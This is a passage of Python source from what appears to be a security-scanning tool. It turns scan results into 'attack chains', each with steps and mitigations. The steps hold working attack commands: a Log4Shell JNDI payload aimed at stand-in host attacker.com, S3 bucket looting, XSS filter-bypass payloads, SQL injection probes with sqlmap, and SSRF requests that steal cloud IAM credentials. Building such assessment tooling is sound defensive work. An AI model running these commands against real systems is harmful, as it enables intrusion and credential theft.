            id=chain_id,
            title=f"Internal URLs Leaked in JS ({len(internal_urls)} URLs)",
            severity="medium",
            confidence=0.5,
            category="info_disclosure",
            description=f"Found {len(internal_urls)} internal/private IP URLs in JavaScript. These reveal internal infrastructure details.",
            target_host=internal_urls[0],
            affected_assets=internal_urls[:10],
            prerequisites=["Internal URLs in client-side code"],
            steps=[
                AttackStep(1, "Document internal infrastructure",
                           "# Map internal IPs and hostnames", "notes",
                           "Build internal network map"),
                AttackStep(2, "Test for SSRF using internal URLs",
                           "# Use discovered internal URLs as SSRF targets",
                           "curl", "Access internal services via SSRF"),
            ],
            tools_needed=["curl"],
            references=["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/05-Review_Webpage_Content_for_Information_Leakage"],
            mitigation="Remove internal URLs from client-side code. Use environment-based API routing.",
            evidence={"internal_urls": internal_urls[:20]},
        ))
    return chains


# ---------------------------------------------------------------------------
# Pattern 10: Technology Stack -> Known CVE Exploitation
# ---------------------------------------------------------------------------
def detect_tech_cve_chains(scan_data: dict[str, Any]) -> list[AttackChain]:
    """Map detected technologies to known critical CVEs."""
    chains: list[AttackChain] = []
    intel_data = scan_data.get("intelligence", {})
    tech_intel = intel_data.get("tech_intelligence", {})

    # Handle tech_intel being a flat list or a dict
    if isinstance(tech_intel, list):
        detected = tech_intel
    elif isinstance(tech_intel, dict):
        detected = tech_intel.get("detected_technologies", [])
    else:
        detected = []

    CVE_MAP = {
        "log4j": ("Log4Shell RCE", "critical", "CVE-2021-44228",
                   "Test with ${jndi:ldap://attacker.com/a} in headers/params"),
        "spring": ("Spring4Shell RCE", "critical", "CVE-2022-22965",
                    "Test class.module.classLoader payload"),
        "apache struts": ("Struts RCE", "critical", "CVE-2023-50164",
                          "Test OGNL injection in Content-Type"),
        "confluence": ("Confluence RCE", "critical", "CVE-2023-22527",
                       "Test SSTI in template injection endpoints"),
        "jenkins": ("Jenkins File Read", "critical", "CVE-2024-23897",
                    "Test jenkins-cli.jar argument parsing"),
        "next.js": ("Next.js Auth Bypass", "critical", "CVE-2025-29927",
                    "Test x-middleware-subrequest header bypass"),
        "tomcat": ("Tomcat RCE", "critical", "CVE-2025-24813",
                   "Test partial PUT with deserialization"),
        "wordpress": ("WordPress Plugin Vulns", "high", "Multiple",
                      "Run wpscan --enumerate vp against target"),
        "php": ("PHP CGI RCE", "critical", "CVE-2024-4577",
                "Test Best-Fit encoding bypass on Windows PHP-CGI"),
    }

    for tech in detected:
        tech_lower = tech.lower() if isinstance(tech, str) else ""
        for key, (title, sev, cve, test_cmd) in CVE_MAP.items():
            if key in tech_lower:
                chain_id = f"chain-cve-{hashlib.md5(f'{key}-{cve}'.encode()).hexdigest()[:8]}"
                chains.append(AttackChain(
                    id=chain_id,
                    title=f"{title} ({cve})",
                    severity=sev,
                    confidence=0.5,
                    category="vulnerability",
                    description=f"Detected {tech} which is associated with {cve}. Verify version and test for exploitability.",
                    target_host="",
                    affected_assets=[tech],
                    prerequisites=[f"{tech} detected in technology stack"],
                    steps=[
                        AttackStep(1, "Confirm exact version",
                                   "# Check response headers, error pages for version info",
                                   "curl", "Identify exact version number"),
                        AttackStep(2, "Check if version is vulnerable",
                                   f"# Cross-reference version with {cve}",
                                   "browser", "Compare with affected version ranges"),
                        AttackStep(3, "Test exploitation",
                                   f"# {test_cmd}", "nuclei/curl",
                                   "Attempt controlled exploitation"),
                    ],
                    tools_needed=["curl", "nuclei"],
                    references=[f"https://nvd.nist.gov/vuln/detail/{cve}" if cve != "Multiple" else "https://wpscan.com"],
                    mitigation=f"Update {tech} to the latest patched version.",
                    evidence={"technology": tech, "cve": cve},
                ))
                break  # One chain per tech
    return chains


# ---------------------------------------------------------------------------
# Pattern 11: Cloud Misconfiguration
# ---------------------------------------------------------------------------
def detect_cloud_misconfig(scan_data: dict[str, Any]) -> list[AttackChain]:
    """S3 buckets, exposed cloud assets, and misconfigured cloud services."""
    chains: list[AttackChain] = []
    cloud_data = scan_data.get("cloud", {})

    # S3 buckets
    buckets = cloud_data.get("s3_buckets", [])
    for bucket in buckets[:10]:
        chain_id = f"chain-cloud-s3-{hashlib.md5(bucket.encode()).hexdigest()[:8]}"
        chains.append(AttackChain(
            id=chain_id,
            title=f"Exposed S3 Bucket: {bucket}",
            severity="high",
            confidence=0.7,
            category="data_exfiltration",
            description=(
                f"S3 bucket '{bucket}' was discovered in scan data. "
                f"If publicly accessible, it may contain sensitive files, backups, "
                f"or configuration data."
            ),
            target_host=bucket,
            affected_assets=[bucket],
            prerequisites=[f"S3 bucket '{bucket}' is publicly accessible"],
            steps=[
                AttackStep(1, "Verify bucket exists", f"aws s3 ls s3://{bucket}/ --no-sign-request", "aws-cli", "List of files or 'Access Denied'"),
                AttackStep(2, "Check bucket ACL", f"aws s3api get-bucket-acl --bucket {bucket} --no-sign-request", "aws-cli", "ACL permissions"),
                AttackStep(3, "Download interesting files", f"aws s3 sync s3://{bucket}/ ./loot/{bucket}/ --no-sign-request", "aws-cli", "Downloaded files"),
            ],
            tools_needed=["aws-cli"],
            mitigation="Restrict S3 bucket policy. Enable 'Block Public Access' at the account level.",
            references=["https://owasp.org/www-project-web-security-testing-guide/"],
        ))

    return chains


# ---------------------------------------------------------------------------
# Pattern 12: API Exposure
# ---------------------------------------------------------------------------
def detect_api_exposure(scan_data: dict[str, Any]) -> list[AttackChain]:
    """Exposed API documentation, GraphQL introspection, and unprotected endpoints."""
    chains: list[AttackChain] = []
    api_data = scan_data.get("api_discovery", {})

    # OpenAPI/Swagger schemas
    for api in api_data.get("api_schemas", []):
        url = api.get("url", "")
        endpoints_count = api.get("endpoints_count", 0)
        chain_id = f"chain-api-{hashlib.md5(url.encode()).hexdigest()[:8]}"

        chains.append(AttackChain(
            id=chain_id,
            title=f"Exposed API Documentation: {url}",
            severity="medium",
            confidence=0.8,
            category="internal_access",
            description=(
                f"API documentation at {url} exposes {endpoints_count} endpoints. "
                f"This reveals internal API structure, parameters, and potentially "
                f"sensitive endpoints that may lack authentication."
            ),
            target_host=url,
            affected_assets=[url],
            prerequisites=["API docs publicly accessible"],
            steps=[
                AttackStep(1, "Download API schema", f"curl -s '{url}' | jq .", "curl/jq", "Full API specification"),
                AttackStep(2, "Test unauthenticated access", "Test each endpoint without auth tokens", "httpx/burp", "200 OK on sensitive endpoints"),
                AttackStep(3, "Check for sensitive endpoints", "Look for /admin, /users, /config paths", "manual", "Sensitive data exposure"),
            ],
            tools_needed=["curl", "jq", "httpx"],
            mitigation="Disable public API docs in production. Require auth for Swagger/OpenAPI endpoints.",
        ))

    # GraphQL introspection
    for gql in api_data.get("graphql_endpoints", []):
        url = gql.get("url", "")
        schema = gql.get("schema", {})
        types_count = schema.get("types_count", 0) if schema else 0
        chain_id = f"chain-gql-{hashlib.md5(url.encode()).hexdigest()[:8]}"

        chains.append(AttackChain(
            id=chain_id,
            title=f"GraphQL Introspection Enabled: {url}",
            severity="medium",
            confidence=0.9,
            category="internal_access",
            description=(
                f"GraphQL endpoint at {url} has introspection enabled, "
                f"exposing {types_count} types. This reveals the entire API schema."
            ),
            target_host=url,
            affected_assets=[url],
            steps=[
                AttackStep(1, "Run introspection query", f"curl -X POST '{url}' -H 'Content-Type: application/json' -d '{{\"query\":\"{{__schema{{types{{name}}}}}}\"}}'", "curl", "Full schema dump"),
                AttackStep(2, "Enumerate mutations", "Query for mutation types and their arguments", "graphql-client", "Writable operations"),
                AttackStep(3, "Test authorization", "Execute queries/mutations without valid auth", "graphql-client", "Unauthorized data access"),
            ],
            tools_needed=["curl", "graphql-voyager", "graphql-client"],
            mitigation="Disable introspection in production. Use graphql-armor or similar.",
        ))

    return chains


# ---------------------------------------------------------------------------
# Pattern 13: GitHub Code Leak
# ---------------------------------------------------------------------------
def detect_github_leaks(scan_data: dict[str, Any]) -> list[AttackChain]:
    """Leaked credentials and configs found via GitHub dorking."""
    chains: list[AttackChain] = []
    gh_data = scan_data.get("github_dork", {})
    findings = gh_data.get("findings", [])

    if not findings:
        return chains

    # Group by repository
    repos: dict[str, list[dict]] = {}
    for f in findings:
        repo = f.get("repository", "unknown")
        repos.setdefault(repo, []).append(f)

    for repo, repo_findings in repos.items():
        chain_id = f"chain-github-{hashlib.md5(repo.encode()).hexdigest()[:8]}"
        queries = [f.get("query", "") for f in repo_findings[:5]]

        chains.append(AttackChain(
            id=chain_id,
            title=f"Code Exposure in {repo}",
            severity="high",
            confidence=0.6,
            category="secret_exploitation",
            description=(
                f"GitHub repository {repo} contains {len(repo_findings)} matches "
                f"for sensitive patterns: {', '.join(queries[:3])}. "
                f"This may include leaked API keys, passwords, or internal configs."
            ),
            target_host=repo,
            affected_assets=[f.get("html_url", "") for f in repo_findings[:5]],
            steps=[
                AttackStep(1, "Review matched files", f"Visit {repo_findings[0].get('html_url', '')}", "browser", "Leaked secrets or config"),
                AttackStep(2, "Check git history", f"git log --all --oneline -- {repo_findings[0].get('file_path', '')}", "git", "Historical commits with secrets"),
                AttackStep(3, "Validate credentials", "Test discovered keys/tokens against target APIs", "curl/httpx", "Authenticated access"),
            ],
            tools_needed=["git", "trufflehog", "gitleaks"],
            mitigation="Rotate all exposed credentials. Use .gitignore and pre-commit hooks. Enable GitHub secret scanning.",
            references=["https://docs.github.com/en/code-security/secret-scanning"],
        ))

    return chains


# ---------------------------------------------------------------------------
# Pattern 14: XSS Candidates — Reflected Parameters
# ---------------------------------------------------------------------------
def detect_xss_candidates(scan_data: dict[str, Any]) -> list[AttackChain]:
    """Find URLs with reflected parameters that may be vulnerable to XSS."""
    chains: list[AttackChain] = []
    endpoints_data = scan_data.get("endpoints", {})
    all_endpoints = endpoints_data.get("endpoints", [])

    # XSS-prone parameter names
    XSS_PARAMS = {
        "q", "search", "query", "s", "keyword", "term", "name", "value",
        "input", "text", "msg", "message", "comment", "body", "title",
        "content", "data", "html", "callback", "jsonp", "error", "err",
    }

    xss_targets = []
    for ep in all_endpoints:
        url = ep if isinstance(ep, str) else ep.get("url", "")
        url_lower = url.lower()
        for param in XSS_PARAMS:
            if f"{param}=" in url_lower or f"&{param}=" in url_lower:
                xss_targets.append({"url": url, "param": param})
                break

    if not xss_targets:
        return chains

    # Group by param to avoid duplicate chains
    seen_params: set[str] = set()
    for target in xss_targets[:10]:  # Cap at 10
        param = target["param"]
        if param in seen_params:
            continue
        seen_params.add(param)
        url = target["url"]
        chain_id = f"chain-xss-{hashlib.md5(f'{param}-{url[:50]}'.encode()).hexdigest()[:8]}"

        chains.append(AttackChain(
            id=chain_id,
            title=f"Reflected XSS via '{param}' Parameter",
            severity="medium",
            confidence=0.4,
            category="xss",
            description=(
                f"The parameter `{param}` appears in URL `{url[:80]}...` and is commonly "
                f"reflected in page output. If input is not sanitized, this could allow "
                f"stored or reflected XSS leading to session hijacking or credential theft."
            ),
            target_host=url,
            affected_assets=[t["url"] for t in xss_targets if t["param"] == param][:5],
            prerequisites=[
                f"Parameter '{param}' accepts user input",
                "Value is reflected in HTML response without encoding",
            ],
            steps=[
                AttackStep(1, f"Test basic reflection in '{param}' parameter",
                           f"curl -s '{url.split('?')[0]}?{param}=sc0utxTEST123' | grep -i 'sc0utxTEST123'",
                           "curl",
                           "If the string appears in the response HTML → reflection confirmed",
                           "If not reflected, try POST method or different encoding"),
                AttackStep(2, "Test HTML injection",
                           f"curl -s '{url.split('?')[0]}?{param}=<b>sc0utx</b>' | grep -i '<b>sc0utx</b>'",
                           "curl",
                           "If <b> tags render → HTML injection confirmed, XSS likely"),
                AttackStep(3, "Test JavaScript execution (harmless payload)",
                           f"# Open in browser with DevTools console open:\n# {url.split('?')[0]}?{param}='\"><img src=x onerror=alert(document.domain)>\n# OR use a headless check:\ncurl -s '{url.split('?')[0]}?{param}=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E' | grep -i 'onerror'",
                           "curl/browser",
                           "Alert fires or payload appears unencoded → CONFIRMED XSS"),
                AttackStep(4, "Check for WAF/filter bypass",
                           "# If basic payloads are blocked, try:\n# Case variation: <ScRiPt>alert(1)</sCrIpT>\n# Event handlers: <svg/onload=alert(1)>\n# Encoding: %3Csvg%20onload%3Dalert(1)%3E\n# Double encoding: %253Csvg%2520onload%253Dalert(1)%253E",
                           "browser",
                           "Bypassed filter = report with bypass details"),
            ],
            tools_needed=["curl", "browser"],
            references=[
                "https://owasp.org/www-community/attacks/xss/",
                "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet",
            ],
            mitigation=(
                "1. **HTML-encode all output** — use context-aware encoding (HTML, JS, URL, CSS)\n"
                "2. **Implement Content-Security-Policy** — restrict inline script execution\n"
                "3. **Use HTTPOnly cookies** — prevent session theft via document.cookie\n"
                "4. **Input validation** — whitelist expected characters for each parameter\n"
                "5. **Use modern frameworks** — React, Vue, Angular auto-escape by default"
            ),
        ))

    return chains


# ---------------------------------------------------------------------------
# Pattern 15: SQLi Candidates — Error-Based Detection
# ---------------------------------------------------------------------------
def detect_sqli_candidates(scan_data: dict[str, Any]) -> list[AttackChain]:
    """Find URLs with parameters that may be vulnerable to SQL injection."""
    chains: list[AttackChain] = []
    endpoints_data = scan_data.get("endpoints", {})
    all_endpoints = endpoints_data.get("endpoints", [])

    # SQLi-prone parameter names
    SQLI_PARAMS = {
        "id", "user_id", "uid", "pid", "item", "product", "category",
        "cat", "page", "order", "sort", "col", "dir", "filter",
        "type", "action", "view", "report", "file", "doc", "num",
    }

    sqli_targets = []
    for ep in all_endpoints:
        url = ep if isinstance(ep, str) else ep.get("url", "")
        url_lower = url.lower()
        for param in SQLI_PARAMS:
            if f"{param}=" in url_lower:
                sqli_targets.append({"url": url, "param": param})
                break

    if not sqli_targets:
        return chains

    seen_params: set[str] = set()
    for target in sqli_targets[:8]:
        param = target["param"]
        if param in seen_params:
            continue
        seen_params.add(param)
        url = target["url"]
        chain_id = f"chain-sqli-{hashlib.md5(f'{param}-{url[:50]}'.encode()).hexdigest()[:8]}"

        chains.append(AttackChain(
            id=chain_id,
            title=f"Potential SQL Injection via '{param}' Parameter",
            severity="high",
            confidence=0.35,
            category="injection",
            description=(
                f"The parameter `{param}` in `{url[:80]}...` accepts numeric or string input "
                f"that is commonly passed to database queries. If unsanitized, this could allow "
                f"SQL injection enabling data exfiltration, authentication bypass, or RCE."
            ),
            target_host=url,
            affected_assets=[t["url"] for t in sqli_targets if t["param"] == param][:5],
            prerequisites=[
                f"Parameter '{param}' is passed to a database query",
                "No parameterized queries / ORM in use",
            ],
            steps=[
                AttackStep(1, "Test for error-based SQL injection",
                           f"# Inject a single quote and look for SQL errors:\ncurl -s \"{url.split('?')[0]}?{param}=1'\" | grep -iE '(sql|syntax|mysql|postgres|sqlite|oracle|mssql|error|warning|ORA-|PG::|SQLSTATE)'",
                           "curl",
                           "SQL error message in response = CONFIRMED SQL injection point",
                           "Common errors: 'You have an error in your SQL syntax', 'unterminated quoted string'"),
                AttackStep(2, "Test boolean-based blind SQLi",
                           f"# Compare responses for TRUE vs FALSE conditions:\ncurl -s \"{url.split('?')[0]}?{param}=1 AND 1=1\" -o /tmp/sqli_true.txt\ncurl -s \"{url.split('?')[0]}?{param}=1 AND 1=2\" -o /tmp/sqli_false.txt\ndiff /tmp/sqli_true.txt /tmp/sqli_false.txt | head -20",
                           "curl/diff",
                           "Different responses = boolean-based blind SQLi confirmed"),
                AttackStep(3, "Test time-based blind SQLi",
                           f"# Inject a sleep command and measure response time:\ntime curl -s \"{url.split('?')[0]}?{param}=1; SELECT SLEEP(5)--\" > /dev/null\n# OR for PostgreSQL:\ntime curl -s \"{url.split('?')[0]}?{param}=1; SELECT pg_sleep(5)--\" > /dev/null",
                           "curl/time",
                           "5+ second delay = time-based blind SQLi confirmed"),
                AttackStep(4, "Automate with sqlmap (if confirmed)",
                           f"sqlmap -u \"{url}\" -p {param} --batch --level 3 --risk 2 --dbs",
                           "sqlmap",
                           "Database names enumerated = report with full scope",
                           "Only run sqlmap if manual tests confirm injection. Use --batch for non-interactive mode"),
            ],
            tools_needed=["curl", "sqlmap"],
            references=[
                "https://owasp.org/www-community/attacks/SQL_Injection",
                "https://portswigger.net/web-security/sql-injection/cheat-sheet",
            ],
            mitigation=(
                "1. **Use parameterized queries** — never concatenate user input into SQL\n"
                "2. **Use an ORM** — SQLAlchemy, Prisma, Sequelize handle escaping\n"
                "3. **Input validation** — whitelist expected types (integer for IDs, etc.)\n"
                "4. **Least privilege** — DB user should have minimal permissions\n"
                "5. **WAF rules** — block common SQLi patterns as defense-in-depth"
            ),
        ))

    return chains


# ---------------------------------------------------------------------------
# Pattern 16: SSRF via Cloud Metadata — Cloud Asset Exploitation
# ---------------------------------------------------------------------------
def detect_ssrf_cloud_metadata(scan_data: dict[str, Any]) -> list[AttackChain]:
    """If cloud assets detected + URL parameters exist, generate SSRF metadata chains."""
    chains: list[AttackChain] = []

    cloud_data = scan_data.get("cloud", {})
    endpoints_data = scan_data.get("endpoints", {})
    all_endpoints = endpoints_data.get("endpoints", [])

    # Check if we have cloud assets
    cloud_assets = cloud_data.get("assets", [])
    cloud_providers = cloud_data.get("providers", [])
    has_cloud = bool(cloud_assets or cloud_providers)

    if not has_cloud:
        # Also check probe data for cloud headers
        probe_data = scan_data.get("probe", {})
        alive = probe_data.get("alive", [])
        for host_info in alive[:20]:
            headers = {}
            if isinstance(host_info, dict):
                headers = host_info.get("headers", {})
            for hdr_name in headers:
                if any(cloud in hdr_name.lower() for cloud in ("x-amz", "x-goog", "x-ms-", "x-azure")):
                    has_cloud = True
                    break
            if has_cloud:
                break

    if not has_cloud:
        return chains

    # Find URL-accepting parameters
    SSRF_PARAMS = {
        "url", "uri", "path", "dest", "redirect", "return", "next",
        "site", "html", "data", "reference", "ref", "link", "src",
        "image", "img", "load", "page", "feed", "to", "out", "view",
        "dir", "show", "navigation", "open", "file", "val", "validate",
        "domain", "callback", "return_path", "target", "proxy", "fetch",
    }

    ssrf_targets = []
    for ep in all_endpoints:
        url = ep if isinstance(ep, str) else ep.get("url", "")
        url_lower = url.lower()
        for param in SSRF_PARAMS:
            if f"{param}=" in url_lower:
                ssrf_targets.append({"url": url, "param": param})
                break

    if not ssrf_targets:
        return chains

    # Generate one chain for the best target
    best = ssrf_targets[0]
    url = best["url"]
    param = best["param"]
    chain_id = f"chain-ssrf-cloud-{hashlib.md5(f'{param}-{url[:50]}'.encode()).hexdigest()[:8]}"

    chains.append(AttackChain(
        id=chain_id,
        title=f"SSRF → Cloud Metadata Exfiltration via '{param}' Parameter",
        severity="critical",
        confidence=0.45,
        category="ssrf",
        description=(
            f"Cloud infrastructure detected (AWS/GCP/Azure) and the parameter `{param}` "
            f"in `{url[:80]}...` accepts URL-like input. If the server fetches user-supplied "
            f"URLs without validation, an attacker can access the cloud metadata endpoint "
            f"(169.254.169.254) to steal IAM credentials, leading to full cloud account compromise."
        ),
        target_host=url,
        affected_assets=[t["url"] for t in ssrf_targets][:5] + [str(a) if isinstance(a, str) else a.get("asset", "") for a in cloud_assets[:3]],
        prerequisites=[
            f"Parameter '{param}' accepts URL/path input",
            "Server fetches the URL server-side (not client-side redirect)",
            "Cloud metadata endpoint (169.254.169.254) is reachable from the server",
        ],
        steps=[
            AttackStep(1, "Test if the parameter fetches external URLs",
                       f"# Use a Burp Collaborator or webhook.site URL:\ncurl -s '{url.split('?')[0]}?{param}=https://webhook.site/<your-id>'\n# Check webhook.site for incoming request from the target server",
                       "curl",
                       "Incoming request on your webhook = server-side fetch confirmed",
                       "If no callback, try: http://your-server:8080/ and listen with nc -lvp 8080"),
            AttackStep(2, "Probe AWS metadata endpoint (IMDSv1)",
                       f"curl -s '{url.split('?')[0]}?{param}=http://169.254.169.254/latest/meta-data/'\n# If blocked, try bypasses:\ncurl -s '{url.split('?')[0]}?{param}=http://[::ffff:169.254.169.254]/latest/meta-data/'\ncurl -s '{url.split('?')[0]}?{param}=http://0xA9FEA9FE/latest/meta-data/'",
                       "curl",
                       "Metadata response (ami-id, instance-id, etc.) = SSRF CONFIRMED"),
            AttackStep(3, "Steal IAM credentials from metadata",
                       f"# Get the IAM role name:\ncurl -s '{url.split('?')[0]}?{param}=http://169.254.169.254/latest/meta-data/iam/security-credentials/'\n# Then fetch the actual credentials:\ncurl -s '{url.split('?')[0]}?{param}=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>'",
                       "curl",
                       "JSON with AccessKeyId, SecretAccessKey, Token = CRITICAL — full cloud compromise",
                       "These are temporary credentials. Use them immediately with: aws sts get-caller-identity"),
            AttackStep(4, "Try GCP metadata (if not AWS)",
                       f"curl -s '{url.split('?')[0]}?{param}=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' -H 'Metadata-Flavor: Google'",
                       "curl",
                       "OAuth token in response = GCP SSRF confirmed"),
            AttackStep(5, "Try Azure metadata (if not AWS/GCP)",
                       f"curl -s '{url.split('?')[0]}?{param}=http://169.254.169.254/metadata/instance?api-version=2021-02-01' -H 'Metadata: true'",
                       "curl",
                       "Instance metadata JSON = Azure SSRF confirmed"),
        ],
        tools_needed=["curl", "browser", "aws-cli"],
        references=[
            "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery",
            "https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf",
        ],
        mitigation=(
            "1. **Block internal IPs** — deny requests to 169.254.0.0/16, 10.0.0.0/8, 172.16.0.0/12\n"
            "2. **Use IMDSv2** — requires session tokens, blocks simple SSRF\n"
            "3. **Allowlist URLs** — only permit requests to known external domains\n"
            "4. **Disable URL parameters** — use IDs/slugs instead of full URLs\n"
            "5. **Network segmentation** — metadata endpoint should not be reachable from web tier"
        ),
    ))

    return chains


# ---------------------------------------------------------------------------
# MASTER PATTERN REGISTRY
# ---------------------------------------------------------------------------
ALL_PATTERNS = [
    detect_subdomain_takeover,
    detect_cors_theft,
    detect_secret_exploitation,
    detect_exposed_databases,
    detect_ssl_downgrade,
    detect_open_redirect_chain,
    detect_nuclei_exploits,
    detect_sensitive_services,
    detect_internal_endpoints,
    detect_tech_cve_chains,
    detect_cloud_misconfig,
    detect_api_exposure,
    detect_github_leaks,
    detect_xss_candidates,
    detect_sqli_candidates,
    detect_ssrf_cloud_metadata,
]

